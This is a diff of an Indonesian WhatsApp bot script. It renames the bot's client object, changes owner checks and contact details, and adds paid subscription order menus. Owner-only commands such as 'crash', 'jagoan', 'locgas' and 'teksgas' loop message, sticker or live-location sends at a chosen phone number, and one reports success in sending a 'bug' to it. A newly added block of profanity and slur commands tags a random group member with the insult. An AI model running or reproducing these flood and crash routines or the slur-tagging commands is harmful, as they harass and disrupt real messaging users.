-      //               title: `LIST PREMIUM`,
-      //               rows: [
-      //                 { title: `1 MINGGU`, rowId: `${prefix}premkay 1minggu` },
-      //                 { title: `1 BULAN`, rowId: `${prefix}premkay 1bulan` },
-      //                 { title: `1 TAHUN`, rowId: `${prefix}premkay 1tahun` },
-      //                 { title: `PERMANENT`, rowId: `${prefix}premkay permanent` },
-      //               ],
-      //             },
-      //             {
-      //               title: `LIST JADI OWNER`,
-      //               rows: [
-      //                 { title: `1 MINGGU`, rowId: `${prefix}ownkay 1minggu` },
-      //                 { title: `1 BULAN`, rowId: `${prefix}ownkay 1bulan` },
-      //                 { title: `1 TAHUN`, rowId: `${prefix}ownkay 1tahun` },
-      //                 { title: `PERMANENT`, rowId: `${prefix}ownkay permanent` },
-      //               ],
-      //             },
-      //           ];
-      //           const listSw = {
-      //             text: `Hai Kak @${sender.split('@')[0]} ${ucapanWaktu}`,
-      //             mentions: [sender],
-      //             footer: `Mau ${command} ya? Silahkan Pencet Di Bawah Ya Kak`,
-      //             buttonText: 'SELECT',
-      //             sections: seactiones,
-      //             listType: 1,
-      //           };
-      //           das.sendMessage(from, listSw, { quoted: m });
-      //         }
-      //         break;
+      case 'buypremium':
+      case 'jadiowner':
+      case 'sewabot':
+        {
+          const seactiones = [
+            {
+              title: `LIST SEWABOT`,
+              rows: [
+                { title: `1 MINGGU`, rowId: `${prefix}sewakay 1minggu` },
+                { title: `1 BULAN`, rowId: `${prefix}sewakay 1bulan` },
+                { title: `1 TAHUN`, rowId: `${prefix}sewakay 1tahun` },
+                { title: `PERMANENT`, rowId: `${prefix}sewakay permanent` },
+              ],
+            },
+            {
+              title: `LIST PREMIUM`,
+              rows: [
+                { title: `1 MINGGU`, rowId: `${prefix}premkay 1minggu` },
+                { title: `1 BULAN`, rowId: `${prefix}premkay 1bulan` },
+                { title: `1 TAHUN`, rowId: `${prefix}premkay 1tahun` },
+                { title: `PERMANENT`, rowId: `${prefix}premkay permanent` },
+              ],
+            },
+            {
+              title: `LIST JADI OWNER`,
+              rows: [
+                { title: `1 MINGGU`, rowId: `${prefix}ownkay 1minggu` },
+                { title: `1 BULAN`, rowId: `${prefix}ownkay 1bulan` },
+                { title: `1 TAHUN`, rowId: `${prefix}ownkay 1tahun` },
+                { title: `PERMANENT`, rowId: `${prefix}ownkay permanent` },
+              ],
+            },
+          ];
+          const listSw = {
+            text: `Hai Kak @${sender.split('@')[0]} ${ucapanWaktu}`,
+            mentions: [sender],
+            footer: `Mau ${command} ya? Silahkan Pencet Di Bawah Ya Kak`,
+            buttonText: 'SELECT',
+            sections: seactiones,
+            listType: 1,
+          };
+          kayla.sendMessage(from, listSw, { quoted: m });
+        }
+        break;
+      case 'sewakay':
+        if (args[0] == '1minggu') {
+          reply(
+            `Pesanan Kamu Sedang Di Proses Oleh Bot, Silahkan Tunggu Nanti Juga Di Chat Owner Untuk Di Konfirmasi`
+          );
+          kayla.sendMessage(
+            creator,
+            {
+              text: `*❏ ORDER ❏*
+📮 : *Paket:* 10K • Sewabot 1 Minggu
+- @${sender.split('@')[0]}`,
+              mentions: [sender],
+            },
+            { quoted: m }
+          );
+        } else if (args[0] == '1bulan') {
+          reply(
+            `Pesanan Kamu Sedang Di Proses Oleh Bot, Silahkan Tunggu Nanti Juga Di Chat Owner Untuk Di Konfirmasi`
+          );
+          kayla.sendMessage(
+            creator,
+            {
+              text: `*❏ ORDER ❏*
+📮 : *Paket:* 20K • Sewabot 1 Bulan
+- @${sender.split('@')[0]}`,
+              mentions: [sender],
+            },
+            { quoted: m }
+          );
+        } else if (args[0] == '1tahun') {
+          reply(
+            `Pesanan Kamu Sedang Di Proses Oleh Bot, Silahkan Tunggu Nanti Juga Di Chat Owner Untuk Di Konfirmasi`
+          );
+          kayla.sendMessage(
+            creator,
+            {
+              text: `*❏ ORDER ❏*
+📮 : *Paket:* 35K • Sewabot 1 Tahun
+- @${sender.split('@')[0]}`,
+              mentions: [sender],
+            },
+            { quoted: m }
+          );
+        } else if (args[0] == 'permanent') {
+          reply(
+            `Pesanan Kamu Sedang Di Proses Oleh Bot, Silahkan Tunggu Nanti Juga Di Chat Owner Untuk Di Konfirmasi`
+          );
+          kayla.sendMessage(
+            creator,
+            {
+              text: `*❏ ORDER ❏*
+📮 : *Paket:* 45K • Sewabot Permanent
+- @${sender.split('@')[0]}`,
+              mentions: [sender],
+            },
+            { quoted: m }
+          );
+        }
+        break;
+      case 'premkay':
+        if (args[0] == '1minggu') {
+          reply(
+            `Pesanan Kamu Sedang Di Proses Oleh Bot, Silahkan Tunggu Nanti Juga Di Chat Owner Untuk Di Konfirmasi`
+          );
+          kayla.sendMessage(
+            creator,
+            {
+              text: `*❏ ORDER ❏*
+📮 : *Paket:* 10K • Premium 1 Minggu
+- @${sender.split('@')[0]}`,
+              mentions: [sender],
+            },
+            { quoted: m }
+          );
+        } else if (args[0] == '1bulan') {
+          reply(
+            `Pesanan Kamu Sedang Di Proses Oleh Bot, Silahkan Tunggu Nanti Juga Di Chat Owner Untuk Di Konfirmasi`
+          );
+          kayla.sendMessage(
+            creator,
+            {
+              text: `*❏ ORDER ❏*
+📮 : *Paket:* 20K • Premium 1 Bulan
+- @${sender.split('@')[0]}`,
+              mentions: [sender],
+            },
+            { quoted: m }
+          );
+        } else if (args[0] == '1tahun') {
+          reply(
+            `Pesanan Kamu Sedang Di Proses Oleh Bot, Silahkan Tunggu Nanti Juga Di Chat Owner Untuk Di Konfirmasi`
+          );
+          kayla.sendMessage(
+            creator,
+            {
+              text: `*❏ ORDER ❏*
+📮 : *Paket:* 35K • Premium 1 Tahun
+- @${sender.split('@')[0]}`,
+              mentions: [sender],
+            },
+            { quoted: m }
+          );
+        } else if (args[0] == 'permanent') {
+          reply(
+            `Pesanan Kamu Sedang Di Proses Oleh Bot, Silahkan Tunggu Nanti Juga Di Chat Owner Untuk Di Konfirmasi`
+          );
+          kayla.sendMessage(
+            creator,
+            {
+              text: `*❏ ORDER ❏*
+📮 : *Paket:* 45K • Premium Permanent
+- @${sender.split('@')[0]}`,
+              mentions: [sender],
+            },
+            { quoted: m }
+          );
+        }
+        break;
+      case 'botkay':
+        if (args[0] == '1minggu') {
+          reply(
+            `Pesanan Kamu Sedang Di Proses Oleh Bot, Silahkan Tunggu Nanti Juga Di Chat Owner Untuk Di Konfirmasi`
+          );
+          kayla.sendMessage(
+            creator,
+            {
+              text: `*❏ ORDER ❏*
+📮 : *Paket:* 10K • Jadibot 1 Minggu
+- @${sender.split('@')[0]}`,
+              mentions: [sender],
+            },
+            { quoted: m }
+          );
+        } else if (args[0] == '1bulan') {
+          reply(
+            `Pesanan Kamu Sedang Di Proses Oleh Bot, Silahkan Tunggu Nanti Juga Di Chat Owner Untuk Di Konfirmasi`
+          );
+          kayla.sendMessage(
+            creator,
+            {
+              text: `*❏ ORDER ❏*
+📮 : *Paket:* 20K • Jadibot 1 Bulan
+- @${sender.split('@')[0]}`,
+              mentions: [sender],
+            },
+            { quoted: m }
+          );
+        } else if (args[0] == '1tahun') {
+          reply(
+            `Pesanan Kamu Sedang Di Proses Oleh Bot, Silahkan Tunggu Nanti Juga Di Chat Owner Untuk Di Konfirmasi`
+          );
+          kayla.sendMessage(
+            creator,
+            {
+              text: `*❏ ORDER ❏*
+📮 : *Paket:* 35K • Jadibot 1 Tahun
+- @${sender.split('@')[0]}`,
+              mentions: [sender],
+            },
+            { quoted: m }
+          );
+        } else if (args[0] == 'permanent') {
+          reply(
+            `Pesanan Kamu Sedang Di Proses Oleh Bot, Silahkan Tunggu Nanti Juga Di Chat Owner Untuk Di Konfirmasi`
+          );
+          kayla.sendMessage(
+            creator,
+            {
+              text: `*❏ ORDER ❏*
+📮 : *Paket:* 45K • Jadibot Permanent
+- @${sender.split('@')[0]}`,
+              mentions: [sender],
+            },
+            { quoted: m }
+          );
+        }
+        break;
+      case 'ownkay':
+        if (args[0] == '1minggu') {
+          reply(
+            `Pesanan Kamu Sedang Di Proses Oleh Bot, Silahkan Tunggu Nanti Juga Di Chat Owner Untuk Di Konfirmasi`
+          );
+          kayla.sendMessage(
+            creator,
+            {
+              text: `*❏ ORDER ❏*
+📮 : *Paket:* 10K • Jadi Owner 1 Minggu
+- @${sender.split('@')[0]}`,
+              mentions: [sender],
+            },
+            { quoted: m }
+          );
+        } else if (args[0] == '1bulan') {
+          reply(
+            `Pesanan Kamu Sedang Di Proses Oleh Bot, Silahkan Tunggu Nanti Juga Di Chat Owner Untuk Di Konfirmasi`
+          );
+          kayla.sendMessage(
+            creator,
+            {
+              text: `*❏ ORDER ❏*
+📮 : *Paket:* 20K • Jadi Owner 1 Bulan
+- @${sender.split('@')[0]}`,
+              mentions: [sender],
+            },
+            { quoted: m }
+          );
+        } else if (args[0] == '1tahun') {
+          reply(
+            `Pesanan Kamu Sedang Di Proses Oleh Bot, Silahkan Tunggu Nanti Juga Di Chat Owner Untuk Di Konfirmasi`
+          );
+          kayla.sendMessage(
+            creator,
+            {
+              text: `*❏ ORDER ❏*
+📮 : *Paket:* 35K • Jadi Owner 1 Tahun
+- @${sender.split('@')[0]}`,
+              mentions: [sender],
+            },
+            { quoted: m }
+          );
+        } else if (args[0] == 'permanent') {
+          reply(
+            `Pesanan Kamu Sedang Di Proses Oleh Bot, Silahkan Tunggu Nanti Juga Di Chat Owner Untuk Di Konfirmasi`
+          );
+          kayla.sendMessage(
+            creator,
+            {
+              text: `*❏ ORDER ❏*
+📮 : *Paket:* 45K • Jadi Owner Permanent
+- @${sender.split('@')[0]}`,
+              mentions: [sender],
+            },
+            { quoted: m }
+          );
+        }
+        break;
       case 'addprem':
-        if (!isOwner) return reply(mess.owner);
+        if (!itsMeKayla) return reply(mess.owner);
         if (!args[0])
           return reply(
             `Penggunaan ${prefix + command} nomor\nContoh ${
               prefix + command
-            } 6285768966412`
+            } 6285216024226`
           );
         prrkek = q.split('|')[0].replace(/[^0-9]/g, '') + `@s.whatsapp.net`;
-        let ceknya = await das.onWhatsApp(prrkek);
+        let ceknya = await kayla.onWhatsApp(prrkek);
         if (ceknya.length == 0)
           return reply(
             `Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`
@@ -3609,26 +3263,25 @@ Makasih Yang Udah ${command} Semoga Rezeki Nya Di Limpahkan Sama Allah SWT.`,
         reply(`Nomor ${prrkek} Telah Menjadi Premium!`);
         break;
       case 'delprem':
-        if (!isOwner) return reply(mess.owner);
+        if (!itsMeKayla) return reply(mess.owner);
         if (!args[0])
           return reply(
             `Penggunaan ${prefix + command} nomor\nContoh ${
               prefix + command
-            } 6285768966412`
+            } 6285216024226`
           );
         ya = q.split('|')[0].replace(/[^0-9]/g, '') + `@s.whatsapp.net`;
         unp = prem.indexOf(ya);
         prem.splice(unp, 1);
         fs.writeFileSync('./database/premium.json', JSON.stringify(prem));
         reply(`Nomor ${ya} Telah Di Hapus Premium!`);
-
         break;
       case 'addvn':
         {
-          if (!isOwner) return reply(mess.owner);
+          if (!itsMeKayla) return reply(mess.owner);
           if (args.length < 1) return reply('Nama audionya apa');
           if (vnnye.includes(q)) return reply('Nama tersebut sudah di gunakan');
-          let delb = await das.downloadAndSaveMediaMessage(quoted);
+          let delb = await kayla.downloadAndSaveMediaMessage(quoted);
           vnnye.push(q);
           await fsx.copy(delb, `./database/Audio/${q}.mp3`);
           fs.writeFileSync('./database/vnadd.json', JSON.stringify(vnnye));
@@ -3638,7 +3291,7 @@ Makasih Yang Udah ${command} Semoga Rezeki Nya Di Limpahkan Sama Allah SWT.`,
         break;
       case 'delvn':
         {
-          if (!isOwner) return reply(mess.owner);
+          if (!itsMeKayla) return reply(mess.owner);
           if (args.length < 1) return reply('Masukan query');
           if (!vnnye.includes(q))
             return reply('Nama tersebut tidak ada di dalam data base');
@@ -3660,15 +3313,15 @@ Makasih Yang Udah ${command} Semoga Rezeki Nya Di Limpahkan Sama Allah SWT.`,
         }
         break;
       case 'addowner':
-        if (!isCreator) return reply(mess.creator);
+        if (!itsMeKayla) return reply(mess.owner);
         if (!args[0])
           return reply(
             `Penggunaan ${prefix + command} nomor\nContoh ${
               prefix + command
-            } 6285768966412`
+            } 6285216024226`
           );
         bnnd = q.split('|')[0].replace(/[^0-9]/g, '');
-        let ceknye = await das.onWhatsApp(bnnd + `@s.whatsapp.net`);
+        let ceknye = await kayla.onWhatsApp(bnnd + `@s.whatsapp.net`);
         if (ceknye.length == 0)
           return reply(
             `Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`
@@ -3678,12 +3331,12 @@ Makasih Yang Udah ${command} Semoga Rezeki Nya Di Limpahkan Sama Allah SWT.`,
         reply(`Nomor ${bnnd} Telah Menjadi Owner!!!`);
         break;
       case 'delowner':
-        if (!isCreator) return reply(mess.creator);
+        if (!itsMeKayla) return reply(mess.owner);
         if (!args[0])
           return reply(
             `Penggunaan ${prefix + command} nomor\nContoh ${
               prefix + command
-            } 6285768966412`
+            } 6285216024226`
           );
         ya = q.split('|')[0].replace(/[^0-9]/g, '');
         unp = owner.indexOf(ya);
@@ -3693,18 +3346,20 @@ Makasih Yang Udah ${command} Semoga Rezeki Nya Di Limpahkan Sama Allah SWT.`,
         break;
       case 'listpremium':
         teks = '*List Premium*\n\n';
-        for (let das of prem) {
-          teks += `- ${das}\n`;
+        for (let kayla of prem) {
+          teks += `- ${kayla}\n`;
         }
         teks += `\n*Total : ${prem.length}*`;
-        das.sendMessage(m.chat, { text: teks.trim() }, 'extendedTextMessage', {
-          quoted: m,
-          contextInfo: { mentionedJid: prem },
-        });
+        kayla.sendMessage(
+          m.chat,
+          { text: teks.trim() },
+          'extendedTextMessage',
+          { quoted: m, contextInfo: { mentionedJid: prem } }
+        );
         break;
       case 'setppbot':
         {
-          if (!isOwner) return reply(mess.owner);
+          if (!itsMeKayla) return reply(mess.owner);
           if (!quoted)
             return reply(
               `Kirim/Reply Image Dengan Caption ${prefix + command}`
@@ -3717,13 +3372,13 @@ Makasih Yang Udah ${command} Semoga Rezeki Nya Di Limpahkan Sama Allah SWT.`,
             return reply(
               `Kirim/Reply Image Dengan Caption ${prefix + command}`
             );
-          var medis = await das.downloadAndSaveMediaMessage(
+          var medis = await kayla.downloadAndSaveMediaMessage(
             quoted,
             'ppbot.jpeg'
           );
           if (args[0] == `/kay`) {
             var { img } = await generateProfilePicture(medis);
-            await das.query({
+            await kayla.query({
               tag: 'iq',
               attrs: {
                 to: botNumber,
@@ -3741,7 +3396,7 @@ Makasih Yang Udah ${command} Semoga Rezeki Nya Di Limpahkan Sama Allah SWT.`,
             fs.unlinkSync(medis);
             reply(`Sukses`);
           } else {
-            var memeg = await das.updateProfilePicture(botNumber, {
+            var memeg = await kayla.updateProfilePicture(botNumber, {
               url: medis,
             });
             fs.unlinkSync(medis);
@@ -3778,10 +3433,10 @@ Makasih Yang Udah ${command} Semoga Rezeki Nya Di Limpahkan Sama Allah SWT.`,
           ],
           listType: 1,
         };
-        const sendMsge = await das.sendMessage(from, listMessageNya);
+        const sendMsge = await kayla.sendMessage(from, listMessageNya);
         break;
       case 'addlist':
-        if (!isOwner) return reply(mess.owner);
+        if (!itsMeKayla) return reply(mess.owner);
         if (!m.isGroup) return reply(mess.group);
         var args1 = text.split('@')[0];
         var args2 = text.split('@')[1];
@@ -3798,7 +3453,7 @@ Makasih Yang Udah ${command} Semoga Rezeki Nya Di Limpahkan Sama Allah SWT.`,
             `List respon dengan key : *${args1}* sudah ada di group ini.`
           );
         if (/image/.test(mime)) {
-          media = await das.downloadAndSaveMediaMessage(quoted);
+          media = await kayla.downloadAndSaveMediaMessage(quoted);
           mem = await uptotelegra(media);
           addResponList(from, args1, args2, true, `${mem}`, db_respon_list);
           reply(`Sukses set list message dengan key : *${args1}*`);
@@ -3809,7 +3464,7 @@ Makasih Yang Udah ${command} Semoga Rezeki Nya Di Limpahkan Sama Allah SWT.`,
         }
         break;
       case 'dellist':
-        if (!isOwner) return reply(mess.owner);
+        if (!itsMeKayla) return reply(mess.owner);
         if (!m.isGroup) return reply(mess.group);
         if (db_respon_list.length === 0)
           return reply(`Belum ada list message di database`);
@@ -3825,7 +3480,7 @@ Makasih Yang Udah ${command} Semoga Rezeki Nya Di Limpahkan Sama Allah SWT.`,
         reply(`Sukses delete list message dengan key *${q}*`);
         break;
       case 'updatelist':
-        if (!isOwner) return reply(mess.owner);
+        if (!itsMeKayla) return reply(mess.owner);
         if (!m.isGroup) return reply(mess.group);
         var args1 = q.split('@')[0];
         var args2 = q.split('@')[1];
@@ -3842,7 +3497,7 @@ Makasih Yang Udah ${command} Semoga Rezeki Nya Di Limpahkan Sama Allah SWT.`,
             `Maaf, untuk key *${args1}* belum terdaftar di group ini`
           );
         if (/image/.test(mime)) {
-          media = await das.downloadAndSaveMediaMessage(quoted);
+          media = await kayla.downloadAndSaveMediaMessage(quoted);
           mem = await uptotelegra(media);
           updateResponList(from, args1, args2, true, `${mem}`, db_respon_list);
           reply(`Sukses update list message dengan key : *${args1}*`);
@@ -3861,8 +3516,8 @@ Makasih Yang Udah ${command} Semoga Rezeki Nya Di Limpahkan Sama Allah SWT.`,
               }\nDurasi Video 1-9 Detik`
             );
           if (/image/.test(mime)) {
-            let media = await das.downloadAndSaveMediaMessage(quoted);
-            let encmedia = await das.sendImageAsSticker(
+            let media = await kayla.downloadAndSaveMediaMessage(quoted);
+            let encmedia = await kayla.sendImageAsSticker(
               m.chat,
               await rmbg(media),
               m,
@@ -3880,9 +3535,9 @@ Makasih Yang Udah ${command} Semoga Rezeki Nya Di Limpahkan Sama Allah SWT.`,
             return reply(
               `Kirim/Reply Foto/Vi Dengan Caption ${prefix + command}`
             );
-          mee = await das.downloadAndSaveMediaMessage(quoted);
+          mee = await kayla.downloadAndSaveMediaMessage(quoted);
           mem = await uptotelegra(mee);
-          das.sendMessage(m.chat, { text: mem }, { quoted: m });
+          kayla.sendMessage(m.chat, { text: mem }, { quoted: m });
         } catch (err) {
           reply(`Reply Image Nya Bang`);
         }
@@ -3901,12 +3556,12 @@ Makasih Yang Udah ${command} Semoga Rezeki Nya Di Limpahkan Sama Allah SWT.`,
             return reply(
               `Kirim/Reply Foto/Vi Dengan Caption ${prefix + command}`
             );
-          meeh = await das.downloadAndSaveMediaMessage(quoted);
+          meeh = await kayla.downloadAndSaveMediaMessage(quoted);
           memh = await uptotelegra(meeh);
           gdye = await getBuffer(
             `https://some-random-api.ml/canvas/${command}?avatar=${memh}`
           );
-          das.sendImageAsSticker(m.chat, gdye, m, {
+          kayla.sendImageAsSticker(m.chat, gdye, m, {
             packname: global.packname,
             author: global.author,
           });
@@ -3921,9 +3576,9 @@ Makasih Yang Udah ${command} Semoga Rezeki Nya Di Limpahkan Sama Allah SWT.`,
               prefix + command
             }`
           );
-        mee = await das.downloadAndSaveMediaMessage(quoted);
+        mee = await kayla.downloadAndSaveMediaMessage(quoted);
         mem = await uptotelegra(mee);
-        das.sendMessage(
+        kayla.sendMessage(
           m.chat,
           {
             audio: { url: mem },
@@ -3941,9 +3596,9 @@ Makasih Yang Udah ${command} Semoga Rezeki Nya Di Limpahkan Sama Allah SWT.`,
               prefix + command
             }`
           );
-        mee = await das.downloadAndSaveMediaMessage(quoted);
+        mee = await kayla.downloadAndSaveMediaMessage(quoted);
         mem = await uptotelegra(mee);
-        das.sendMessage(
+        kayla.sendMessage(
           m.chat,
           {
             audio: { url: mem },
@@ -3967,9 +3622,9 @@ Makasih Yang Udah ${command} Semoga Rezeki Nya Di Limpahkan Sama Allah SWT.`,
               prefix + command
             }`
           );
-        mee = await das.downloadAndSaveMediaMessage(quoted);
+        mee = await kayla.downloadAndSaveMediaMessage(quoted);
         mem = await uptotelegra(mee);
-        das.sendMessage(
+        kayla.sendMessage(
           m.chat,
           {
             document: { url: mem },
@@ -3990,12 +3645,12 @@ Makasih Yang Udah ${command} Semoga Rezeki Nya Di Limpahkan Sama Allah SWT.`,
           return reply(
             `Kirim/Reply Foto Dengan Caption ${prefix + command} *teks*`
           );
-        mee = await das.downloadAndSaveMediaMessage(quoted);
+        mee = await kayla.downloadAndSaveMediaMessage(quoted);
         mem = await uptotelegra(mee);
         kaytid = await getBuffer(
           `https://api.memegen.link/images/custom/-/${q}.png?background=${mem}`
         );
-        das.sendImageAsSticker(m.chat, kaytid, m, {
+        kayla.sendImageAsSticker(m.chat, kaytid, m, {
           packname: global.packname,
           author: global.author,
         });
@@ -4797,7 +4452,7 @@ Makasih Yang Udah ${command} Semoga Rezeki Nya Di Limpahkan Sama Allah SWT.`,
 
 *≡═════《 CEKSIFATME 》═════≡*`;
         buff = await getBuffer(ppuser);
-        das.sendMessage(
+        kayla.sendMessage(
           from,
           { image: buff, caption: profile, mentions: [bet] },
           { quoted: m }
@@ -4807,13 +4462,13 @@ Makasih Yang Udah ${command} Semoga Rezeki Nya Di Limpahkan Sama Allah SWT.`,
         {
           if (!/webp/.test(mime))
             return reply(`balas stiker dengan caption *${prefix + command}*`);
-          let media = await das.downloadAndSaveMediaMessage(quoted);
+          let media = await kayla.downloadAndSaveMediaMessage(quoted);
           let ran = await getRandom('.png');
           exec(`ffmpeg -i ${media} ${ran}`, (err) => {
             fs.unlinkSync(media);
             if (err) throw err;
             let buffer = fs.readFileSync(ran);
-            das.sendMessage(
+            kayla.sendMessage(
               m.chat,
               {
                 image: buffer,
@@ -4828,9 +4483,9 @@ Makasih Yang Udah ${command} Semoga Rezeki Nya Di Limpahkan Sama Allah SWT.`,
                     mediaType: 1,
                     thumbnail: ppnyauser,
                     mediaUrl:
-                      'https://chat.whatsapp.com/CfF9ehZcKrMJl8EXpYd11Q',
+                      'https://chat.whatsapp.com/KG9EraduWh2Bz3mdWbkHjl',
                     sourceUrl:
-                      'https://chat.whatsapp.com/CfF9ehZcKrMJl8EXpYd11Q',
+                      'https://chat.whatsapp.com/KG9EraduWh2Bz3mdWbkHjl',
                   },
                 },
               },
@@ -4843,14 +4498,15 @@ Makasih Yang Udah ${command} Semoga Rezeki Nya Di Limpahkan Sama Allah SWT.`,
       case 'sticker':
       case 's':
         {
-          let pre = `${prefix + command}`;
           if (!quoted)
             return reply(
-              `Kirim/Reply Gambar/Video/Gifs Dengan Caption ${pre}\nDurasi Video 1-9 Detik`
+              `Kirim/Reply Gambar/Video/Gifs Dengan Caption ${
+                prefix + command
+              }\nDurasi Video 1-9 Detik`
             );
           if (/image/.test(mime)) {
             let media = await quoted.download();
-            let encmedia = await das.sendImageAsSticker(m.chat, media, m, {
+            let encmedia = await kayla.sendImageAsSticker(m.chat, media, m, {
               packname: global.packname,
               author: global.author,
             });
@@ -4858,47 +4514,75 @@ Makasih Yang Udah ${command} Semoga Rezeki Nya Di Limpahkan Sama Allah SWT.`,
           } else if (/video/.test(mime)) {
             if ((quoted.msg || quoted).seconds > 11)
               return reply(
-                `Kirim/Reply Gambar/Video/Gifs Dengan Caption ${pre}\nDurasi Video 1-9 Detik`
+                'Kirim/Reply Gambar/Video/Gifs Dengan Caption ${prefix+command}\nDurasi Video 1-9 Detik'
               );
             let media = await quoted.download();
-            let encmedia = await das.sendVideoAsSticker(m.chat, media, m, {
+            let encmedia = await kayla.sendVideoAsSticker(m.chat, media, m, {
               packname: global.packname,
               author: global.author,
             });
             await fs.unlinkSync(encmedia);
           } else {
             reply(
-              `Kirim/Reply Gambar/Video/Gifs Dengan Caption ${pre}\nDurasi Video 1-9 Detik`
+              `Kirim/Reply Gambar/Video/Gifs Dengan Caption ${
+                prefix + command
+              }\nDurasi Video 1-9 Detik`
             );
           }
         }
         break;
-      case 'tes':
+      case 'memek':
+      case 'bego':
+      case 'goblok':
+      case 'janda':
+      case 'perawan':
+      case 'babi':
+      case 'tolol':
+      case 'pinter':
+      case 'pintar':
+      case 'asu':
+      case 'bodoh':
+      case 'gay':
+      case 'lesby':
+      case 'bajingan':
+      case 'jancok':
+      case 'anjing':
+      case 'ngentod':
+      case 'ngentot':
+      case 'monyet':
+      case 'mastah':
+      case 'newbie':
+      case 'bangsat':
+      case 'bangke':
+      case 'sange':
+      case 'sangean':
+      case 'dakjal':
+      case 'horny':
+      case 'wibu':
+      case 'puki':
+      case 'peak':
+      case 'pantex':
+      case 'pantek':
+      case 'setan':
+      case 'iblis':
+      case 'cacat':
+      case 'yatim':
+      case 'piatu':
         {
-          const { writeFile } = require('fs/promises');
-          if (/image/.test(mime)) {
-            const messageType = Object.keys(m.message)[0]; // get what type of message it is -- text, image, video
-            // if the message is an image
-            if (messageType === 'imageMessage') {
-              // download the message
-              const buffer = await downloadMediaMessage(
-                m,
-                'buffer',
-                {},
-                {
-                  logger,
-                  // pass this so that baileys can request a reupload of media
-                  // that has been deleted
-                  reuploadRequest: das.updateMediaMessage,
-                }
-              );
-              // save to file
-              await writeFile('./my-download.jpeg', buffer);
-            }
-          }
+          if (!m.isGroup) return reply(mess.group);
+          let member = participants.map((u) => u.id);
+          let org = member[Math.floor(Math.random() * member.length)];
+          kayla.sendMessage(
+            from,
+            {
+              text: `anak ${command} di sini adalah @${org.split('@')[0]}`,
+              mentions: [org],
+            },
+            { quoted: m }
+          );
         }
         break;
-
+      case 'goblokcek':
       case 'jelekcek':
       case 'gaycek':
       case 'rate':
@@ -4947,6 +4631,7 @@ Makasih Yang Udah ${command} Semoga Rezeki Nya Di Limpahkan Sama Allah SWT.`,
       case 'cekharam':
       case 'cekpakboy':
       case 'cekpakgirl':
+      case 'ceksange':
       case 'cekbaper':
       case 'cekfakboy':
       case 'cekalim':
@@ -4960,7 +4645,7 @@ Makasih Yang Udah ${command} Semoga Rezeki Nya Di Limpahkan Sama Allah SWT.`,
         const cex = body.slice(0);
         const cek2 = cek1[Math.floor(Math.random() * cek1.length)];
         if (mentionByReply) {
-          das.sendMessage(
+          kayla.sendMessage(
             from,
             {
               text:
@@ -4976,7 +4661,7 @@ Makasih Yang Udah ${command} Semoga Rezeki Nya Di Limpahkan Sama Allah SWT.`,
             { quoted: m }
           );
         } else if (mentionByTag[0] && isGroup) {
-          das.sendMessage(
+          kayla.sendMessage(
             from,
             {
               text:
@@ -4992,7 +4677,7 @@ Makasih Yang Udah ${command} Semoga Rezeki Nya Di Limpahkan Sama Allah SWT.`,
             { quoted: m }
           );
         } else if (!mentionByReply && !mentionByTag[0]) {
-          das.sendMessage(
+          kayla.sendMessage(
             from,
             {
               text:
@@ -5036,7 +4721,7 @@ ${meg.result}`);
         break;
       case 'vote':
         {
-          if (!isOwner) return reply(mess.owner);
+          if (!itsMeKayla) return reply(mess.owner);
           var pollCreation = generateWAMessageFromContent(
             m.chat,
             proto.Message.fromObject({
@@ -5064,7 +4749,7 @@ ${meg.result}`);
             }),
             { userJid: m.chat, quoted: crsh }
           );
-          das.relayMessage(m.chat, pollCreation.message, {
+          kayla.relayMessage(m.chat, pollCreation.message, {
             messageId: pollCreation.key.id,
           });
           reply(mess.succes);
@@ -5076,7 +4761,7 @@ ${meg.result}`);
           num = q.split('|')[0].replace(/[^0-9]/g, '') + '@s.whatsapp.net';
           jumlah = '30';
           for (let i = 0; i < jumlah; i++) {
-            das.sendMessage(num, { text: `hai` }, { quoted: lep });
+            kayla.sendMessage(num, { text: `hai` }, { quoted: lep });
             await sleep(1000);
           }
           reply(`Sukses Send Bug Ke Nomor ${q} Sebanyak ${jumlah}`);
@@ -5084,16 +4769,16 @@ ${meg.result}`);
         break;
       case 'crash':
         {
-          if (!isOwner) return reply(mess.owner);
+          if (!itsMeKayla) return reply(mess.owner);
           if (!q)
             return reply(
               `Penggunaan ${prefix + command} nomor\nContoh ${
                 prefix + command
-              } 6285768966412`
+              } 6285216024226`
             );
           jumlah = '15';
           for (let i = 0; i < jumlah; i++) {
-            das.sendMessage(
+            kayla.sendMessage(
               `${q}`.split('-').join('').split(' ').join('').replace('+', '') +
                 '@s.whatsapp.net',
               { sticker: ppnyauser },
@@ -5132,14 +4817,14 @@ ${meg.result}`);
         break;
       case 'jagoan':
         {
-          if (!isOwner) return reply(mess.owner);
+          if (!itsMeKayla) return reply(mess.owner);
           if (!q)
             return reply(
               `Penggunaan ${prefix + command} nomor\nContoh ${
                 prefix + command
-              } 6285768966412`
+              } 6285216024226`
             );
-          das.relayMessage(
+          kayla.relayMessage(
             m.mentionedJid[0]
               ? m.mentionedJid[0]
               : m.quoted
@@ -5177,8 +4862,8 @@ ${meg.result}`);
         break;
       case 'jagoanneon':
         {
-          if (!isOwner) return reply(mess.owner);
-          das.relayMessage(
+          if (!itsMeKayla) return reply(mess.owner);
+          kayla.relayMessage(
             m.mentionedJid[0]
               ? m.mentionedJid[0]
               : m.quoted
@@ -5216,7 +4901,7 @@ ${meg.result}`);
         break;
       case 'locgas':
         {
-          if (!isOwner) return reply(mess.owner);
+          if (!itsMeKayla) return reply(mess.owner);
           if (!q)
             return reply(
               `Penggunaan ${prefix + command} nomor\nContoh ${
@@ -5228,7 +4913,7 @@ ${meg.result}`);
           for (let i = 0; i < jumlah; i++) {
             var messa = await prepareWAMessageMedia(
               { image: ppnyauser },
-              { upload: das.waUploadToServer }
+              { upload: kayla.waUploadToServer }
             );
             var liveLocation = generateWAMessageFromContent(
               num,
@@ -5246,7 +4931,7 @@ ${meg.result}`);
               }),
               { userJid: num, quoted: lep }
             );
-            das.relayMessage(num, liveLocation.message, {
+            kayla.relayMessage(num, liveLocation.message, {
               messageId: liveLocation.key.id,
             });
             await sleep(1000);
@@ -5256,7 +4941,7 @@ ${meg.result}`);
         break;
       case 'teksgas':
         {
-          if (!isOwner) return reply(mess.owner);
+          if (!itsMeKayla) return reply(mess.owner);
           if (!q)
             return reply(
               `Penggunaan ${prefix + command} nomor\nContoh ${
@@ -5266,7 +4951,7 @@ ${meg.result}`);
           num = `${q}` + '@s.whatsapp.net';
           jumlah = '25';
